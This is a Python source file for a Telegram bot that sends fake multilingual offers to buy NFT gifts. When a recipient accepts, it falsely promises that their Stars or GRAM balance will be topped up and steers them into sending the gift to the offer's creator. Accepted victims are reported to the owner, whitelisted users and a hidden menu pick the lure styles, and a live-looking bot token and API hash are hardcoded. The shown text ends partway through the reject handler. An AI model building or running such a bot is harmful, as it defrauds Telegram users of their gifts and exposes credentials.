import os
import re
import asyncio
import html
from datetime import datetime, timedelta, timezone
from telethon import TelegramClient, events, Button
from telethon.tl import types, functions
from telethon.tl.types import UpdateBotNewBusinessMessage, UpdateBusinessBotCallbackQuery
from aiohttp import web, ClientSession

print("ехала воркааать")

# ============================================================
# НАСТРОЙКИ БОТА
# ============================================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "9221538184:AAFe-XVHDaxgkI5WKS9uwUdvLgVHANvJXlo")
API_ID = int(os.environ.get("API_ID", 31174488))
API_HASH = os.environ.get("API_HASH", "4c664ade94861675c4977d1258cd9493")

client = TelegramClient('bot_session', API_ID, API_HASH)

# ТВОЙ ID (Главный админ: получает уведомления, доступ к /adminsk)
OWNER_ID = 9169861040

# ПРОСТО РАЗРЕШЁННЫЕ ПОЛЬЗОВАТЕЛИ (Могут юзать бота и настраивать свой вид оффера)
ALLOWED_IDS = [8741930065, 8344506378, 8255375422, 7900220465, 5023023809, 6754259387, 9037521438, 8617029901, 6988780286, 8803174617, 6937808392]

# БЕЛЫЙ СПИСОК (Ты + все разрешенные)
allowed_users = set(ALLOWED_IDS + [OWNER_ID])

admin_state = {}
active_offers: dict = {}
user_settings: dict = {}


# ============================================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ============================================================

def format_date(expires_at):
    months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October',
              'November', 'December']
    month_str = months[expires_at.month - 1]
    time_str = expires_at.strftime("%H:%M")
    return f"{expires_at.day} {month_str} {time_str} UTC"


def get_balance_text(lang: str, currency: str) -> str:
    if currency == 'GRAM':
        if lang == 'ru':
            return "баланс будет пополнен в GRAM"
        elif lang == 'ua':
            return "баланс буде поповнено в GRAM"
        elif lang == 'ar':
            return "سيتم شحن الرصيد في GRAM"
        elif lang == 'zh':
            return "余额将充值到 GRAM"
        else:
            return "balance will be topped up in GRAM"
    else:
        if lang == 'ru':
            return "баланс будет пополнен в <a href=\"tg://stars\">звёзды</a>"
        elif lang == 'ua':
            return "баланс буде поповнено в <a href=\"tg://stars\">зірки</a>"
        elif lang == 'ar':
            return "سيتم شحن الرصيد في <a href=\"tg://stars\">النجوم</a>"
        elif lang == 'zh':
            return "余额将充值到 <a href=\"tg://stars\">星星</a>"
        else:
            return "balance will be topped up in <a href=\"tg://stars\">stars</a>"


def build_offer_text_v3(offer_data: dict, expires_at: datetime, sender_name: str, text_style: int) -> str:
    gift_name = html.escape(offer_data['gift_name'])
    link = offer_data['link']
    price = offer_data['price']
    currency_emoji = "⭐" if offer_data['currency'] == 'STARS' else "💎"
    date_str = format_date(expires_at)
    lang = offer_data['lang']
    sender_name = html.escape(sender_name)

    gift_link = f'<a href="{link}"><b>{gift_name}</b></a>'
    sender_bold = f'<b>{sender_name}</b>'
    price_bold = f'<b>{price}</b>'

    if lang == 'ua':
        if text_style == 1:
            return f"👤 Користувач {sender_bold} надіслав вам оффер на {gift_link}\n⭐️ Сума оффера: {price_bold} {currency_emoji}.\n📝 За подарунок: {gift_link}\n⏳ Тривалість: 5h 59m 59s"
        elif text_style == 2:
            return f"Користувач {sender_bold} пропонує вам {price_bold}{currency_emoji} за подарунок {gift_link}.\n\nПропозиція діє ще 6г.\n⏰ До: {date_str}"
        elif text_style == 3:
            return f"🔔 Оффер на подарунок\n{sender_bold} хоче купити {gift_link} за {price_bold} {currency_emoji}.\n⏳ Залишилось: 5h 59m 59s · до {date_str}"
        elif text_style == 4:
            return f"🔔 Новий оффер!\n{sender_bold} хоче купити {gift_link} за {price_bold} {currency_emoji}.\n⏳ Залишилось: 5h 59m 59s · до {date_str}"
        elif text_style == 5:
            return f"📨 Оффер на подарунок\n━━━━━━━━━━━━━━\n👤 Від: {sender_bold}\n🎁 Подарунок: {gift_link}\n⭐️ Сума: {price_bold} {currency_emoji}\n⏳ Термін: 5h 59m 59s\n🕒 До: {date_str}\n━━━━━━━━━━━━━━"

    elif lang == 'ru':
        if text_style == 1:
            return f"👤 Пользователь {sender_bold} отправил вам оффер на {gift_link}\n⭐️ Сумма оффера: {price_bold} {currency_emoji}.\n📝 За подарок: {gift_link}\n⏳ Длительность: 5h 59m 59s"
        elif text_style == 2:
            return f"Пользователь {sender_bold} предлагает вам {price_bold}{currency_emoji} за подарок {gift_link}.\n\nПредложение действует еще 6ч.\n⏰ До: {date_str}"
        elif text_style == 3:
            return f"🔔 Оффер на подарок\n{sender_bold} хочет купить {gift_link} за {price_bold} {currency_emoji}.\n⏳ Осталось: 5h 59m 59s · до {date_str}"
        elif text_style == 4:
            return f"🔔 Новый оффер!\n{sender_bold} хочет купить {gift_link} за {price_bold} {currency_emoji}.\n⏳ Осталось: 5h 59m 59s · до {date_str}"
        elif text_style == 5:
            return f"📨 Оффер на подарок\n━━━━━━━━━━━━━━\n👤 От: {sender_bold}\n🎁 Подарок: {gift_link}\n⭐️ Сумма: {price_bold} {currency_emoji}\n⏳ Срок: 5h 59m 59s\n🕒 До: {date_str}\n━━━━━━━━━━━━━━"

    elif lang == 'ar':
        if text_style == 1:
            return f"👤 أرسل لك المستخدم {sender_bold} عرضًا على {gift_link}\n⭐️ مبلغ العرض: {price_bold} {currency_emoji}.\n📝 مقابل الهدية: {gift_link}\n⏳ المدة: 5h 59m 59s"
        elif text_style == 2:
            return f"يعرض عليك المستخدم {sender_bold} مبلغ {price_bold}{currency_emoji} مقابل الهدية {gift_link}.\n\nالعرض صالح لمدة 6 ساعات.\n⏰ حتى: {date_str}"
        elif text_style == 3:
            return f"🔔 عرض على الهدية\nيريد {sender_bold} شراء {gift_link} مقابل {price_bold} {currency_emoji}.\n⏳ المتبقي: 5h 59m 59s · حتى {date_str}"
        elif text_style == 4:
            return f"🔔 عرض جديد!\nيريد {sender_bold} شراء {gift_link} مقابل {price_bold} {currency_emoji}.\n⏳ المتبقي: 5h 59m 59s · حتى {date_str}"
        elif text_style == 5:
            return f"📨 عرض على الهدية\n━━━━━━━━━━━━━━\n👤 من: {sender_bold}\n🎁 الهدية: {gift_link}\n⭐️ المبلغ: {price_bold} {currency_emoji}\n⏳ المدة: 5h 59m 59s\n🕒 حتى: {date_str}\n━━━━━━━━━━━━━━"

    elif lang == 'zh':
        if text_style == 1:
            return f"👤 用户 {sender_bold} 向您发送了关于 {gift_link} 的报价\n⭐️ 报价金额: {price_bold} {currency_emoji}.\n📝 礼物: {gift_link}\n⏳ 持续时间: 5h 59m 59s"
        elif text_style == 2:
            return f"用户 {sender_bold} 向您出价 {price_bold}{currency_emoji} 购买礼物 {gift_link}。\n\n报价有效期为 6 小时。\n⏰ 截止至: {date_str}"
        elif text_style == 3:
            return f"🔔 礼物报价\n{sender_bold} 想以 {price_bold} {currency_emoji} 购买 {gift_link}。\n⏳ 剩余时间: 5h 59m 59s · 截止至 {date_str}"
        elif text_style == 4:
            return f"🔔 新报价！\n{sender_bold} 想以 {price_bold} {currency_emoji} 购买 {gift_link}。\n⏳ 剩余时间: 5h 59m 59s · 截止至 {date_str}"
        elif text_style == 5:
            return f"📨 礼物报价\n━━━━━━━━━━━━━━\n👤 来自: {sender_bold}\n🎁 礼物: {gift_link}\n⭐️ 金额: {price_bold} {currency_emoji}\n⏳ 持续时间: 5h 59m 59s\n🕒 截止至: {date_str}\n━━━━━━━━━━━━━━"

    else:  # eng
        if text_style == 1:
            return f"👤 User {sender_bold} sent you an offer for {gift_link}\n⭐️ Offer amount: {price_bold} {currency_emoji}.\n📝 For the gift: {gift_link}\n⏳ Duration: 5h 59m 59s"
        elif text_style == 2:
            return f"User {sender_bold} is offering you {price_bold}{currency_emoji} for the gift {gift_link}.\n\nOffer valid for 6h.\n⏰ Until: {date_str}"
        elif text_style == 3:
            return f"🔔 Offer for gift\n{sender_bold} wants to buy {gift_link} for {price_bold} {currency_emoji}.\n⏳ Remaining: 5h 59m 59s · until {date_str}"
        elif text_style == 4:
            return f"🔔 New offer!\n{sender_bold} wants to buy {gift_link} for {price_bold} {currency_emoji}.\n⏳ Remaining: 5h 59m 59s · until {date_str}"
        elif text_style == 5:
            return f"📨 Gift Offer\n━━━━━━━━━━━━━━\n👤 From: {sender_bold}\n🎁 Gift: {gift_link}\n⭐️ Amount: {price_bold} {currency_emoji}\n⏳ Duration: 5h 59m 59s\n🕒 Until: {date_str}\n━━━━━━━━━━━━━━"


def build_offer_text(offer_data: dict, expires_at: datetime, sender_name: str = "User") -> str:
    currency_emoji = "⭐" if offer_data['currency'] == 'STARS' else "💎"
    gift_name = html.escape(offer_data['gift_name'])
    link = offer_data['link']
    date_str = format_date(expires_at)
    lang = offer_data['lang']
    sender_name = html.escape(sender_name)

    gift_link = f'<a href="{link}"><b>{gift_name}</b></a>'
    sender_bold = f'<b>{sender_name}</b>'
    price_bold = f'<b>{offer_data["price"]}</b>'

    if lang == 'ua':
        return f"👤 Користувач {sender_bold} надіслав вам оффер на {gift_link}\n⭐️ Сума оффера: {price_bold} {currency_emoji}.\n📝 За подарунок: {gift_link}\n⏳ Тривалість: 5h 59m 59s\n⏰ До: {date_str}"
    elif lang == 'ar':
        return f"👤 أرسل لك المستخدم {sender_bold} عرضًا على {gift_link}\n⭐️ مبلغ العرض: {price_bold} {currency_emoji}.\n📝 مقابل الهدية: {gift_link}\n⏳ المدة: 5h 59m 59s\n⏰ حتى: {date_str}"
    elif lang == 'zh':
        return f"👤 用户 {sender_bold} 向您发送了关于 {gift_link} 的报价\n⭐️ 报价金额: {price_bold} {currency_emoji}.\n📝 礼物: {gift_link}\n⏳ 持续时间: 5h 59m 59s\n⏰ 截止至: {date_str}"
    elif lang == 'eng':
        return f"👤 User {sender_bold} sent you an offer for {gift_link}\n⭐️ Offer amount: {price_bold} {currency_emoji}.\n📝 For the gift: {gift_link}\n⏳ Duration: 5h 59m 59s\n⏰ Until: {date_str}"
    else:  # ru
        return f"👤 Пользователь {sender_bold} отправил вам оффер на {gift_link}\n⭐ Сумма оффера: {price_bold} {currency_emoji}.\n📝 За подарок: {gift_link}\n⏳ Длительность: 5h 59m 59s\n⏰ До: {date_str}"


def build_offer_buttons_v3(offer_id: str, button_style: int, price: int, currency: str, lang: str):
    currency_emoji = "⭐" if currency == 'STARS' else "💎"

    if lang == 'ru':
        acc, rej, get = "✓ Принять", "⊗ Отклонить", "✓ Получить"
    elif lang == 'ua':
        acc, rej, get = "✓ Прийняти", "⊗ Відхилити", "✓ Отримати"
    elif lang == 'ar':
        acc, rej, get = "✓ قبول", "⊗ رفض", "✓ الحصول"
    elif lang == 'zh':
        acc, rej, get = "✓ 接受", "⊗ 拒绝", "✓ 领取"
    else:
        acc, rej, get = "✓ Accept", "⊗ Decline", "✓ Get"

    if button_style == 1:
        return [[Button.inline(acc, data=f"offer_accept:{offer_id}".encode()),
                 Button.inline(rej, data=f"offer_reject:{offer_id}".encode())]]
    elif button_style == 2:
        return [[
            types.KeyboardButtonCallback(text=acc, data=f"offer_accept:{offer_id}".encode(),
                                         style=types.KeyboardButtonStyle(bg_success=True)),
            types.KeyboardButtonCallback(text=rej, data=f"offer_reject:{offer_id}".encode(),
                                         style=types.KeyboardButtonStyle(bg_danger=True))
        ]]
    elif button_style == 3:
        return [
            [types.KeyboardButtonCallback(text=f"{get} {price}{currency_emoji}", data=f"offer_get:{offer_id}".encode(),
                                          style=types.KeyboardButtonStyle(bg_success=True))]]
    elif button_style == 4:
        return [[Button.inline(f"{get} {price}{currency_emoji}", data=f"offer_get:{offer_id}".encode())]]


def build_offer_buttons(offer_data: dict, offer_id: str, user_id: int = None):
    if offer_data['offer_type'] == 'buy3':
        btn_style = user_settings.get(user_id, {}).get('button_style', 1)
        return build_offer_buttons_v3(offer_id, btn_style, offer_data['price'], offer_data['currency'],
                                      offer_data['lang'])
    elif offer_data['offer_type'] == 'buy2':
        lang = offer_data['lang']
        currency_emoji = "⭐" if offer_data['currency'] == 'STARS' else "💎"
        get_txt = "✓ Получить" if lang == 'ru' else "✓ Отримати" if lang == 'ua' else "✓ 领取" if lang == 'zh' else "✓ الحصول" if lang == 'ar' else "✓ Get"
        return [
            [Button.inline(f"{get_txt} {offer_data['price']}{currency_emoji}", data=f"offer_get:{offer_id}".encode())]]
    else:
        lang = offer_data['lang']
        acc = "✓ Принять" if lang == 'ru' else "✓ Прийняти" if lang == 'ua' else "✓ 接受" if lang == 'zh' else "✓ قبول" if lang == 'ar' else "✓ Accept"
        rej = "⊗ Отклонить" if lang == 'ru' else "⊗ Відхилити" if lang == 'ua' else "⊗ 拒绝" if lang == 'zh' else "⊗ رفض" if lang == 'ar' else "⊗ Decline"
        return [[Button.inline(acc, data=f"offer_accept:{offer_id}".encode()),
                 Button.inline(rej, data=f"offer_reject:{offer_id}".encode())]]


def build_transfer_buttons(offer_id: str, lang: str, target_username: str):
    if lang == 'ru':
        transfer_text, how_text = "✓ Передать NFT", "📤 Как передать?"
    elif lang == 'ua':
        transfer_text, how_text = "✓ Передати NFT", "📤 Як передати?"
    elif lang == 'ar':
        transfer_text, how_text = "✓ تحويل NFT", "📤 كيفية التحويل؟"
    elif lang == 'zh':
        transfer_text, how_text = "✓ 转移 NFT", "📤 如何转移？"
    else:
        transfer_text, how_text = "✓ Transfer NFT", "📤 How to transfer?"
    url = f"tg://send_gift?to={target_username}"
    return [[Button.url(transfer_text, url)], [Button.inline(how_text, data=f"transfer_how:{offer_id}".encode())]]


def build_cancel_text(lang: str) -> str:
    if lang == 'ru':
        return "⊗ Оффер отклонён"
    elif lang == 'ua':
        return "⊗ Оффер відхилено"
    elif lang == 'ar':
        return "⊗ تم رفض العرض"
    elif lang == 'zh':
        return "⊗ 报价已拒绝"
    else:
        return "⊗ Offer declined"


def get_biz_markup(offer_data, offer_id, user_id):
    currency_emoji = "⭐" if offer_data['currency'] == 'STARS' else "💎"

    if offer_data['offer_type'] == 'buy3':
        style = user_settings.get(user_id, {}).get('button_style', 1)
        lang = offer_data['lang']
        if lang == 'ru':
            acc, rej, get = "✓ Принять", "⊗ Отклонить", "✓ Получить"
        elif lang == 'ua':
            acc, rej, get = "✓ Прийняти", "⊗ Відхилити", "✓ Отримати"
        elif lang == 'ar':
            acc, rej, get = "✓ قبول", "⊗ رفض", "✓ الحصول"
        elif lang == 'zh':
            acc, rej, get = "✓ 接受", "⊗ 拒绝", "✓ 领取"
        else:
            acc, rej, get = "✓ Accept", "⊗ Decline", "✓ Get"

        if style == 1:
            return {"inline_keyboard": [[{"text": acc, "callback_data": f"offer_accept:{offer_id}"},
                                         {"text": rej, "callback_data": f"offer_reject:{offer_id}"}]]}
        elif style == 2:
            return {"inline_keyboard": [[
                {"text": acc, "callback_data": f"offer_accept:{offer_id}", "style": "success"},
                {"text": rej, "callback_data": f"offer_reject:{offer_id}", "style": "danger"}
            ]]}
        elif style == 3:
            return {"inline_keyboard": [
                [{"text": f"{get} {offer_data['price']}{currency_emoji}", "callback_data": f"offer_get:{offer_id}",
                  "style": "success"}]]}
        elif style == 4:
            return {"inline_keyboard": [
                [{"text": f"{get} {offer_data['price']}{currency_emoji}", "callback_data": f"offer_get:{offer_id}"}]]}

    elif offer_data['offer_type'] == 'buy2':
        lang = offer_data['lang']
        get_txt = "✓ Получить" if lang == 'ru' else "✓ Отримати" if lang == 'ua' else "✓ 领取" if lang == 'zh' else "✓ الحصول" if lang == 'ar' else "✓ Get"
        return {"inline_keyboard": [
            [{"text": f"{get_txt} {offer_data['price']}{currency_emoji}", "callback_data": f"offer_get:{offer_id}",
              "style": "success"}]]}
    else:
        lang = offer_data['lang']
        acc = "✓ Принять" if lang == 'ru' else "✓ Прийняти" if lang == 'ua' else "✓ 接受" if lang == 'zh' else "✓ قبول" if lang == 'ar' else "✓ Accept"
        rej = "⊗ Отклонить" if lang == 'ru' else "⊗ Відхилити" if lang == 'ua' else "⊗ 拒绝" if lang == 'zh' else "⊗ رفض" if lang == 'ar' else "⊗ Decline"
        return {"inline_keyboard": [[{"text": acc, "callback_data": f"offer_accept:{offer_id}"},
                                     {"text": rej, "callback_data": f"offer_reject:{offer_id}"}]]}


# ============================================================
# АДМИНКА /adminsk И /salfetka5
# ============================================================

@client.on(events.NewMessage(pattern='/adminsk'))
async def adminsk(event: events.NewMessage.Event):
    if event.sender_id != OWNER_ID: return
    admin_state[event.sender_id] = 'waiting_id'
    await event.respond("Отправьте ID пользователя, которому хотите выдать доступ к боту.")


@client.on(events.NewMessage(
    func=lambda e: e.is_private and e.sender_id in admin_state and admin_state[e.sender_id] == 'waiting_id'))
async def adminsk_id(event: events.NewMessage.Event):
    if event.sender_id != OWNER_ID: return
    try:
        uid = int(event.raw_text.strip())
        allowed_users.add(uid)
        admin_state.pop(event.sender_id)
        await event.respond(f"✅ Пользователь <code>{uid}</code> добавлен в белый список бота!", parse_mode='html')
    except ValueError:
        await event.respond("❌ Неверный ID. Отправьте число или /cancel.")


@client.on(events.NewMessage(pattern='/cancel'))
async def cancel(event: events.NewMessage.Event):
    if event.sender_id == OWNER_ID and event.sender_id in admin_state:
        admin_state.pop(event.sender_id)
        await event.respond("Действие отменено.")


@client.on(events.NewMessage(pattern='/salfetka5'))
async def secret_menu(event: events.NewMessage.Event):
    user_id = event.sender_id
    if user_id not in allowed_users: return

    if user_id not in user_settings:
        user_settings[user_id] = {'notifications': True, 'lang': 'ru', 'text_style': 1, 'button_style': 1}

    text_style = user_settings[user_id].get('text_style', 1)
    btn_style = user_settings[user_id].get('button_style', 1)

    dummy_offer = {'offer_type': 'buy3', 'price': 1000, 'currency': 'STARS', 'gift_name': 'PlushPepe #1',
                   'link': 'https://t.me/nft/PlushPepe-1', 'lang': 'ru'}
    expires = datetime.now(timezone.utc) + timedelta(hours=6)

    preview_text = build_offer_text_v3(dummy_offer, expires, "User", text_style)

    buttons = [
        [Button.inline(f"⬅️ Текст {text_style} ➡️", data=b"admin_text_next")],
        [Button.inline(f"⬅️ Кнопки {btn_style} ➡️", data=b"admin_btn_next")],
        [Button.inline("👀 Обновить превью", data=b"admin_preview")]
    ]

    await event.respond(f"🕵️‍♂️ <b>Ваша настройка .buy3</b>\n\n<b>Превью:</b>\n\n{preview_text}", buttons=buttons,
                        parse_mode='html', link_preview=True)


@client.on(events.CallbackQuery(pattern=b'^admin_'))
async def admin_handler(event: events.CallbackQuery.Event):
    user_id = event.sender_id
    if user_id not in allowed_users: return

    if user_id not in user_settings:
        user_settings[user_id] = {'notifications': True, 'lang': 'ru', 'text_style': 1, 'button_style': 1}

    action = event.data.decode().replace('admin_', '')

    if 'text_style' not in user_settings[user_id]: user_settings[user_id]['text_style'] = 1
    if 'button_style' not in user_settings[user_id]: user_settings[user_id]['button_style'] = 1

    if action == 'text_next':
        user_settings[user_id]['text_style'] = (user_settings[user_id]['text_style'] % 5) + 1
    elif action == 'btn_next':
        user_settings[user_id]['button_style'] = (user_settings[user_id]['button_style'] % 4) + 1

    text_style = user_settings[user_id]['text_style']
    btn_style = user_settings[user_id]['button_style']

    dummy_offer = {'offer_type': 'buy3', 'price': 1000, 'currency': 'STARS', 'gift_name': 'PlushPepe #1',
                   'link': 'https://t.me/nft/PlushPepe-1', 'lang': 'ru'}
    expires = datetime.now(timezone.utc) + timedelta(hours=6)

    preview_text = build_offer_text_v3(dummy_offer, expires, "User", text_style)

    buttons = [
        [Button.inline(f"⬅️ Текст {text_style} ➡️", data=b"admin_text_next")],
        [Button.inline(f"⬅️ Кнопки {btn_style} ➡️", data=b"admin_btn_next")],
        [Button.inline("👀 Обновить превью", data=b"admin_preview")]
    ]

    try:
        await event.edit(f"🕵️‍♂️ <b>Ваша настройка .buy3</b>\n\n<b>Превью:</b>\n\n{preview_text}", buttons=buttons,
                         parse_mode='html', link_preview=True)
    except Exception as e:
        if "MessageNotModifiedError" not in type(e).__name__:
            print(f"Ошибка редактирования: {e}")

    await event.answer(f"Выбрано: Текст {text_style}, Кнопки {btn_style}")


def parse_buy_command(text: str):
    clean_text = text.strip().replace('\u200b', '').replace('\xa0', ' ')
    pattern = r'\.(buy2?|buy3)\s+(ru|eng|ar|zh|ua)\s+(https?://\S+)\s+(\d+)\s+(stars|GRAM)'
    match = re.search(pattern, clean_text, re.IGNORECASE)
    if not match: return None
    offer_type, lang, link, price_str, currency = match.groups()
    price = int(price_str)
    currency = currency.upper()

    gift_slug = link.split('/')[-1]
    if '-' in gift_slug:
        name_part, num_part = gift_slug.rsplit('-', 1)
        name_with_spaces = re.sub(r'([a-z])([A-Z])', r'\1 \2', name_part)
        gift_name = f"{name_with_spaces} #{num_part}"
    else:
        gift_name = gift_slug

    return {'offer_type': offer_type.lower(), 'lang': lang.lower(), 'link': link, 'price': price, 'currency': currency,
            'gift_name': gift_name}


# ============================================================
# 3 РЕЖИМА РАБОТЫ ОФФЕРОВ
# ============================================================

# 1. ИНЛАЙН
@client.on(events.InlineQuery)
async def handle_inline_query(event: events.InlineQuery.Event):
    user_id = event.sender_id
    if user_id not in allowed_users:
        return await event.answer([event.builder.article(title="Ограничено", text="Нет доступа")])

    offer_data = parse_buy_command(event.text)
    if not offer_data:
        return await event.answer([event.builder.article(title="Ошибка", text="Неверный формат")])

    offer_id = f"{event.sender_id}_{int(datetime.now().timestamp())}"
    expires_at = datetime.now(timezone.utc) + timedelta(hours=6)

    sender = await event.get_sender()
    sender_name = sender.first_name or "User"

    if offer_data['offer_type'] == 'buy3':
        t_style = user_settings.get(user_id, {}).get('text_style', 1)
        text = build_offer_text_v3(offer_data, expires_at, sender_name, t_style)
    else:
        text = build_offer_text(offer_data, expires_at, sender_name)

    buttons = build_offer_buttons(offer_data, offer_id, user_id)

    result = event.builder.article(title="Оффер", text=text, buttons=buttons, parse_mode='html', link_preview=True)
    await event.answer([result])

    seller_username = sender.username if sender.username else str(sender.id)
    active_offers[offer_id] = {
        'offer_id': offer_id, 'offer_type': offer_data['offer_type'], 'lang': offer_data['lang'],
        'gift_name': offer_data['gift_name'],
        'link': offer_data['link'], 'price': offer_data['price'], 'currency': offer_data['currency'],
        'sender_id': event.sender_id, 'sender_name': sender_name, 'seller_username': seller_username,
        'status': 'pending',
    }


# 2. ЛИЧКА БОТУ
@client.on(events.NewMessage(incoming=True, func=lambda e: e.is_private and e.raw_text and ('.buy' in e.raw_text)))
async def handle_private_message(event: events.NewMessage.Event):
    if event.sender_id not in allowed_users: return
    offer_data = parse_buy_command(event.raw_text)
    if not offer_data: return

    try:
        await event.delete()
    except Exception:
        pass

    offer_id = f"{event.sender_id}_{int(datetime.now().timestamp())}"
    expires_at = datetime.now(timezone.utc) + timedelta(hours=6)

    sender = await event.get_sender()
    sender_name = sender.first_name or "User"

    if offer_data['offer_type'] == 'buy3':
        t_style = user_settings.get(event.sender_id, {}).get('text_style', 1)
        text = build_offer_text_v3(offer_data, expires_at, sender_name, t_style)
    else:
        text = build_offer_text(offer_data, expires_at, sender_name)

    buttons = build_offer_buttons(offer_data, offer_id, event.sender_id)

    await event.respond(text, buttons=buttons, parse_mode='html', link_preview=True)

    seller_username = sender.username if sender.username else str(sender.id)
    active_offers[offer_id] = {
        'offer_id': offer_id, 'offer_type': offer_data['offer_type'], 'lang': offer_data['lang'],
        'gift_name': offer_data['gift_name'],
        'link': offer_data['link'], 'price': offer_data['price'], 'currency': offer_data['currency'],
        'sender_id': event.sender_id, 'sender_name': sender_name, 'seller_username': seller_username,
        'status': 'pending',
    }


# 3. АВТОМАТИЗАЦИЯ ЧАТОВ
@client.on(events.Raw(types=UpdateBotNewBusinessMessage))
async def handle_business_message(update: UpdateBotNewBusinessMessage):
    if not update.message.message or ('.buy' not in update.message.message) or not update.message.from_id: return

    user_id = update.message.from_id.user_id
    if user_id not in allowed_users: return

    offer_data = parse_buy_command(update.message.message)
    if not offer_data: return

    offer_id = f"biz_{user_id}_{int(datetime.now().timestamp())}"
    expires_at = datetime.now(timezone.utc) + timedelta(hours=6)

    try:
        full_user = await client(functions.users.GetFullUserRequest(id=user_id))
        sender_name = full_user.users[0].first_name or "User"
        seller_username = full_user.users[0].username or str(user_id)
    except Exception:
        sender_name = "User"
        seller_username = str(user_id)

    if offer_data['offer_type'] == 'buy3':
        t_style = user_settings.get(user_id, {}).get('text_style', 1)
        offer_text = build_offer_text_v3(offer_data, expires_at, sender_name, t_style)
    else:
        offer_text = build_offer_text(offer_data, expires_at, sender_name)

    reply_markup = get_biz_markup(offer_data, offer_id, user_id)

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"

    await asyncio.sleep(1)

    async with ClientSession() as session:
        resp = await session.post(url + "editMessageText", json={
            "business_connection_id": update.connection_id,
            "chat_id": update.message.peer_id.user_id,
            "message_id": update.message.id,
            "text": offer_text,
            "parse_mode": "HTML",
            "reply_markup": reply_markup,
            "link_preview_options": {
                "is_disabled": False,
                "show_above_text": True
            }
        })

    active_offers[offer_id] = {
        'offer_id': offer_id, 'offer_type': offer_data['offer_type'], 'lang': offer_data['lang'],
        'gift_name': offer_data['gift_name'],
        'link': offer_data['link'], 'price': offer_data['price'], 'currency': offer_data['currency'],
        'sender_id': user_id, 'sender_name': sender_name, 'seller_username': seller_username, 'status': 'pending',
        'business_connection_id': update.connection_id, 'chat_id': update.message.peer_id.user_id,
        'message_id': update.message.id
    }


# ============================================================
# КНОПКИ ОФФЕРОВ (С УВЕДОМЛЕНИЕМ)
# ============================================================

@client.on(events.Raw(types=UpdateBusinessBotCallbackQuery))
async def handle_business_callback(update: UpdateBusinessBotCallbackQuery):
    action, offer_id = update.data.decode().split(':', 1)
    offer = active_offers.get(offer_id)
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    lang = offer.get('lang', 'ru') if offer else 'ru'

    async with ClientSession() as session:
        await session.post(url + "answerCallbackQuery", json={"callback_query_id": update.query_id})
        if not offer: return

        if action == 'offer_get' or action == 'offer_accept':
            offer['status'] = 'accepted'

            # УВЕДОМЛЕНИЕ О ПРИНЯТИИ (ТОЛЬКО OWNER_ID)
            try:
                buyer_username = f"@{update.user.username}" if hasattr(update.user,
                                                                       'username') and update.user.username else str(
                    update.user_id)
                notif = (
                    f"✅ <b>Оффер принят!</b>\n\n"
                    f"📅 <b>Дата:</b> {datetime.now().strftime('%d.%m.%Y %H:%M')}\n"
                    f"🔗 <b>Подарок:</b> <a href='{offer['link']}'>{offer['gift_name']}</a>\n"
                    f"👤 <b>Продавец:</b> {offer.get('sender_name', 'Unknown')} (@{offer.get('seller_username', 'Unknown')})\n"
                    f"🛒 <b>Покупатель:</b> {buyer_username}\n"
                    f"💰 <b>Сумма:</b> {offer['price']} {offer['currency']}"
                )
                await client.send_message(OWNER_ID, notif, parse_mode='html')
            except Exception as e:
                print("Notif error:", e)

            bal_text = get_balance_text(lang, offer['currency'])

            if action == 'offer_get':
                if lang == 'ua':
                    success_text = f"✓ <b>Очікуйте подарунок!</b>\n\nНатисніть на кнопку нижче, обов'язково додавши співрозмовника в контакти, інакше подарунок не з'явиться.\n\n⭐ Після отримання {bal_text}"
                elif lang == 'ru':
                    success_text = f"✓ <b>Ожидайте подарок!</b>\n\nНажмите на кнопку ниже, обязательно добавив собеседника в контакты, иначе подарок не появится.\n\n⭐ После получения {bal_text}"
                elif lang == 'ar':
                    success_text = f"✓ <b>انتظر الهدية!</b>\n\nانقر على الزر أدناه، مع التأكد من إضافة المرسل إلى جهات الاتصال، وإلا لن تظهر الهدية.\n\n⭐ بعد الاستلام، {bal_text}"
                elif lang == 'zh':
                    success_text = f"✓ <b>请等待礼物！</b>\n\n请点击下方按钮，务必先将发送者加入通讯录，否则礼物将不会出现。\n\n⭐ 领取后，{bal_text}"
                else:
                    success_text = f"✓ <b>Wait for the gift!</b>\n\nClick the button below, making sure to add the sender to your contacts, otherwise the gift won't appear.\n\n⭐ After receiving, {bal_text}"

                btn_txt = "✓ Передать NFT" if lang == 'ru' else "✓ Передати NFT" if lang == 'ua' else "✓ تحويل NFT" if lang == 'ar' else "✓ 转移 NFT" if lang == 'zh' else "✓ Transfer NFT"
                reply_markup = {"inline_keyboard": [
                    [{"text": btn_txt, "url": f"tg://send_gift?to={offer.get('seller_username', '')}"}]]}
            else:
                if lang == 'ua':
                    success_text = f"✓ <b>Пропозицію прийнято!</b>\n\nТепер ви можете перейти до відправлення подарунка.\n\n⭐ Після відправлення подарунка {bal_text}"
                elif lang == 'ru':
                    success_text = f"✓ <b>Предложение принято!</b>\n\nТеперь вы можете перейти к отправке подарка.\n\n⭐ После отправки подарка {bal_text}"
                elif lang == 'ar':
                    success_text = f"✓ <b>تم قبول العرض!</b>\n\nيمكنك الآن المتابعة لإرسال الهدية.\n\n⭐ بعد إرسال الهدية، {bal_text}"
                elif lang == 'zh':
                    success_text = f"✓ <b>报价已接受！</b>\n\n您现在可以继续发送礼物了。\n\n⭐ 发送礼物后，{bal_text}"
                else:
                    success_text = f"✓ <b>Offer accepted!</b>\n\nYou can now proceed to send the gift.\n\n⭐ After sending the gift, {bal_text}"

                reply_markup = {"inline_keyboard": [
                    [{
                         "text": "✓ Передать NFT" if lang == 'ru' else "✓ Передати NFT" if lang == 'ua' else "✓ تحويل NFT" if lang == 'ar' else "✓ 转移 NFT" if lang == 'zh' else "✓ Transfer NFT",
                         "url": f"tg://send_gift?to={offer.get('seller_username', '')}"}],
                    [{
                         "text": "📤 Как передать?" if lang == 'ru' else "📤 Як передати?" if lang == 'ua' else "📤 كيفية التحويل؟" if lang == 'ar' else "📤 如何转移？" if lang == 'zh' else "📤 How to transfer?",
                         "callback_data": f"transfer_how:{offer_id}"}]
                ]}

            await session.post(url + "editMessageText", json={
                "business_connection_id": offer['business_connection_id'], "chat_id": offer['chat_id'],
                "message_id": offer['message_id'], "text": success_text, "parse_mode": "HTML",
                "reply_markup": reply_markup,
                "link_preview_options": {"is_disabled": False}
            })

        elif action == 'offer_reject':
            offer['status'] = 'rejected'
